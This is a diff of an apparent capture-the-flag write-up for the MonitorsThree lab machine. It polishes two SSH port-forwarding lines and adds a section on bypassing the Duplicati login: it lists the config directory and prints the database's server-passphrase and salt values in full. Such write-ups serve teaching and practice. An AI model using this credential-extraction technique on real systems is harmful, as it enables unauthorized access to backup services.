@@ -914,9 +914,9 @@ services:
 
 It reveals that `duplicati` is using port 8200 and its config directory.
 
-With this information, we can do a `port forwarding` connecting with ssh:
+With this information, we can set up a `port forwarding` connection using SSH:
 
-- (We use id_rsa authentication because with marcus password does not work)
+- (We use `id_rsa` authentication because with marcus's password does not work)
 
 <br />
 
@@ -941,3 +941,64 @@ We try to reuse marcus credentials without success:
 ![17](../../../assets/images/MonitorsThree/17.png)
 
 <br />
+
+## Duplicati Login Bypass:
+
+<br />
+
+After doing some research about this software, we find a very useful [post on Medium](https://read.martiandefense.llc/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee). 
+
+It explains how an attacker can bypass the Duplicati login using the `server-passphrase`.
+
+In our case, we can obtain this value from the duplicati's DB into the `/opt/duplicati/config` path:
+
+<br />
+
+```bash
+marcus@monitorsthree:/opt/duplicati/config$ ls
+CTADPNHLTC.sqlite  Duplicati-server.sqlite  control_dir_v2
+```
+
+<br />
+
+It's inside the `Option` table:
+
+<br />
+
+```bash
+sqlite> select * from Option;
+4||encryption-module|
+4||compression-module|zip
+4||dblock-size|50mb
+4||--no-encryption|true
+-1||--asynchronous-upload-limit|50
+-1||--asynchronous-concurrent-upload-limit|50
+-2||startup-delay|0s
+-2||max-download-speed|
+-2||max-upload-speed|
+-2||thread-priority|
+-2||last-webserver-port|8200
+-2||is-first-run|
+-2||server-port-changed|True
+-2||server-passphrase|Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=
+-2||server-passphrase-salt|xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=
+-2||server-passphrase-trayicon|e983b41d-7947-45a1-90c0-22ce2f95e49e
+-2||server-passphrase-trayicon-hash|Xc+yx69jieZfVrdcugV2kclgErQ2QmOE3uCHTdaBkfY=
+-2||last-update-check|638813426777242290
+-2||update-check-interval|
+-2||update-check-latest|
+-2||unacked-error|False
+-2||unacked-warning|False
+-2||server-listen-interface|any
+-2||server-ssl-certificate|
+-2||has-fixed-invalid-backup-id|True
+-2||update-channel|
+-2||usage-reporter-level|
+-2||has-asked-for-password-protection|true
+-2||disable-tray-icon-login|false
+-2||allowed-hostnames|*
+```
+
+<br />
+
+
